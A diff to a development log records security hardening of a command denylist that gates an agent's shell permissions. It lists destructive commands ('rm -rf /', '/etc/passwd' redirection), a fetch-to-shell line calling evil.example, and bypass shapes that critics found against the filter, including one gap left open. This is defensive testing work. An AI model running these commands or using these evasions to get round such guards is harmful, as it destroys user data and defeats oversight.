@@ -10764,3 +10764,120 @@ exclusion rather than triggering the symlink rejection — was noticed during th
 a genuinely low-value, out-of-scope edge case (the exclusion exists for hash-purity reasons already
 established by this piece's own precedent, not as a general symlink-safety mechanism for every future
 consumer of the fetched directory) rather than silently left unrecorded.
+
+## M11 P9 — Security invariants S1, S2, S4: containment, denylist composition, network isolation (`20`
+§20.10 S1/S2/S4)
+
+**Mandate:** the first batch of `20` §20.10's own S-labeled adversarial security tests — establishing
+the harness pattern P10-P12 reuse — against invariants the plan's own text says already have a real
+enforcement mechanism, adding only the missing test.
+
+**Investigation found the plan's own premise true for S1, false for S2, and partly true for S4.** S1:
+`@forge/core`'s `ProjectPaths.resolveWithin` genuinely already exists and already had real symlink/
+traversal test coverage (`PLAN-M1.md` P4) — this piece's own job was a distinctly S1-labeled,
+end-to-end (`writeFileAtomic`, not merely `resolveWithin` throwing) adversarial test, placed at
+`packages/core/test/security/s1-containment.test.ts` rather than the plan's own stated `packages/vcs/
+test/security/` — `@forge/vcs`'s own `specs/02` §2.2 row is `['schemas']`, no edge to `@forge/core` at
+all, confirmed directly against the boundaries graph and `vcs`'s own `package.json`, and `@forge/vcs`
+implements no containment logic of its own to test locally instead — a disclosed Surface deviation
+(`SPEC-QUESTIONS.md` Q169, the same precedent Q104/`PLAN-M11.md` P1 already established). S2: grepping
+every `src/` directory in the workspace for a hard-denylist mechanism found **none existed at all** —
+`isExecAllowed` (`packages/adapter-kit/src/grants/exec.ts`) was a pure allowlist matcher whose own
+pre-existing test suite explicitly asserted `exec: ['*']` permitted `rm -rf /`, and its own
+wildcard-prefix match (`command.startsWith(prefix)`) was independently vulnerable to the exact
+shell-operator-composition attack `20` §20.10 S2 names (`exec: ['pnpm test*']` matched `"pnpm test;
+rm -rf /"`). S4: `isHostAllowed` (`packages/adapter-kit/src/grants/network.ts`) has zero production
+call sites anywhere — the real, live enforcement of `network: none` is entirely the external Claude
+Code CLI/SDK's own tool-allowlist mechanism, untestable here without a live API key.
+
+Built (per this piece's own explicit mandate to fix, not merely document, a real gap found):
+`packages/adapter-kit/src/grants/denylist.ts` (`isHardDenylisted`, entirely new), consulted by
+`isExecAllowed` before any allowlist pattern and unconditionally, covering `rm -rf /`/`~` (any flag/
+path spelling), `sudo`, `chmod -R 777` (any octal spelling), a fetch piped to a shell interpreter, and
+an unconditional `git push --force`/`-f`, split against shell-operator-separated clauses; a fix to
+`exec.ts`'s `matchesExecPattern` refusing a wildcard match whenever the whole command contains a shell
+metacharacter; and the three S-labeled test files
+(`packages/core/test/security/s1-containment.test.ts`, `packages/engine/test/security/
+s2-denylist.test.ts` via a real `FakePlatformAdapter` session across every real
+`SessionRequest.permissionMode`, `packages/adapter-kit/test/security/s4-network-isolation.test.ts`
+via a real local TCP listener plus a negative control). Full reasoning in `SPEC-QUESTIONS.md` Q169.
+
+### Round 1 — fresh critic: 3 blocking, 4 major
+
+A fresh, context-free critic, instructed specifically to try to find a way around the S2
+shell-operator-composition test, found real, reproduced-with-`node` bypasses: **(1) blocking** — bare
+`&` (background execution, not `&&`) was not a clause separator in `isHardDenylisted`'s own
+`splitClauses`, so `"echo hi & rm -rf /"` evaded every rule entirely; **(2) blocking** — a subshell
+`(...)` glued its own leading `(` onto the wrapped command's first token (`"(rm -rf /)"` tokenized as
+`["(rm", "-rf", "/"]`), defeating every rule for anything wrapped in parens, not only `rm`; **(3)
+blocking** — `exec.ts`'s own `SHELL_OPERATOR_PATTERN` (the wildcard-composition fix) was missing
+`\n`/`\r`/`<`/`>`, so a newline-separated second command or shell redirection (`"pnpm test >
+/etc/passwd"`) both still matched a wildcard-prefix grant unrefused, directly contradicting the fix's
+own doc comment; **(4) major** — `isRmRfRootOrHome`'s target matching compared only the exact strings
+`/`/`~`/`~/`, missing `//`/`/.`/`$HOME`; **(5) major** — `isFetchPipedToShell` missed an absolute-path
+(`/bin/bash`) or `env`-wrapped interpreter; **(6) major** — `isChmodR777` missed the leading-zero
+octal spelling `0777`; **(7) major** — the S4 test's file name, sitting next to the S1/S2 files that
+*do* exercise real enforcement paths, risked reading as "S4 fully covered" when the actual production
+mechanism (Claude Code's own tool-allowlist) has no automated regression coverage in this file at all.
+
+**What the critic caught that the builder missed:** every one of the six substantive findings traces
+to the same root cause the builder's own first-draft tests never adversarially probed — each rule was
+tested only against the single, canonical spelling of its own attack (`rm -rf /`, `curl x | sh`), never
+against a real alternate operator, path, or octal spelling a genuine attacker (or a differently-styled
+but entirely legitimate script) would actually produce.
+
+Fixed all seven: `&` added to the clause-split regex (ordered after `&&`); `(`/`)` now unconditional
+clause boundaries; `\n`/`\r`/`<`/`>` added to `SHELL_OPERATOR_PATTERN`; `isRootOrHomeTarget` rewritten
+using `path.posix.normalize` plus a `$HOME`/`${HOME}` literal set; a new `interpreterBasename` helper
+skipping wrapper tokens then resolving via `path.posix.basename`; `OCTAL_777_PATTERN` (`/^0*777$/`);
+and the S4 test's doc comment now explicitly cross-references `packages/adapter-claude-code/test/
+tool-grant.test.ts` as the real production-path regression coverage, naming what this file does and
+does not prove.
+
+### Round 2 — fresh critic: 1 blocking (incomplete fix), 2 new blocking/major
+
+A second fresh, context-free critic verified all seven round-1 fixes by tracing/executing the code
+directly (not trusting doc comments), confirmed all held under further adversarial construction
+(nested subshells, `&`+subshell combinations) — except one: **(1) blocking, incomplete round-1 fix** —
+`interpreterBasename` only ever skipped a *bare* `sudo`/`env` token, so `env`'s own real invocation
+shapes (`env -i bash`, `env FOO=bar bash`) still evaded it. The critic additionally found, independent
+of the round-1 findings: **(2) blocking** — every `SINGLE_STAGE_RULES` check compared `tokens[0]`
+against a bare literal with zero path normalisation (the identical defect `interpreterBasename` had
+been built to fix, never generalised past the one rule that needed it for round 1's own attack), so
+`/bin/rm -rf /`, `/usr/bin/sudo rm -rf /`, `/bin/chmod -R 777 .`, and `/usr/bin/git push --force` —
+entirely ordinary invocations, not obscure evasions — all evaded their own rule; **(3) major** —
+`isForceGitPush` assumed `push` was always `tokens[1]`, missing git's own real global options that can
+precede it (`git -C <dir> push --force`), a shape FORGE's own real git usage makes plausible since
+`@forge/vcs` itself always runs git scoped to a specific worktree.
+
+**What the critic caught that the builder missed:** finding (2) is the sharper version of the same
+lesson round 1 already taught and the builder still only partially absorbed — a fix scoped to the one
+rule the round-1 critic's own repro happened to exercise (the fetch-to-shell interpreter check) rather
+than to the shared root cause (unnormalised `tokens[0]` comparison) present in all four other rules
+too. Fixed by generalising: a shared `commandName` (resolves `tokens[0]` via `path.posix.basename`)
+and `stripWrapperTokens` (skips a leading run of `sudo`/`env`, including `env`'s own flags and
+`VAR=val` assignments) used by every rule, not reimplemented per rule; and `findGitSubcommand`, which
+walks past git's own known global options to find the real subcommand wherever it falls.
+
+**Self-directed adversarial verification after both critic rounds** (not merely trusting two clean
+critic passes) found one further real gap: process substitution (`bash <(curl https://evil.example/x)`)
+delivers a fetch's output to a shell interpreter the same way a pipe does, but the fetch and the
+interpreter land in two different *clauses* (the subshell-boundary fix from round 1 treats `<(`'s own
+`(` as a clause separator) rather than adjacent pipe stages of the same clause, so the fetch-piped-to-
+shell rule's own adjacency check misses it. Judged a genuine structural limit of a heuristic
+string/token scan (not a real POSIX shell parser) rather than fixed: closing it fully means modelling
+real shell grammar (`eval`, `xargs bash`, ANSI-C quoting, brace expansion, ...), an open-ended arms
+race against a scripting language's full grammar rather than the fixed, enumerable list `20` §20.1
+actually names. Disclosed in `denylist.ts`'s own doc comment and `SPEC-QUESTIONS.md` Q169, the same
+"disclosed rather than silently dropped" treatment already given to the three §20.1 shapes this module
+never attempted (branch-context-dependent operations, package publish, disk formatting) — not scope
+quietly narrowed to dodge a finding.
+
+### Mandatory full-workspace verification — clean
+
+Whole-workspace `pnpm typecheck` (21/21 packages), `eslint --max-warnings 0`, `prettier --check`, and
+`node scripts/check-boundaries.mjs` all clean throughout, re-run after every fix round. A full,
+unscoped `node scripts/run-tests.mjs run` reported **457 test files, 7920 passing, 5 skipped, 0
+failures** — including `packages/engine/test/e2e/crash-resume.test.ts` (one of the four accepted
+load-sensitive flakes) passing cleanly on this run, and none of the other three named flakes firing
+either.
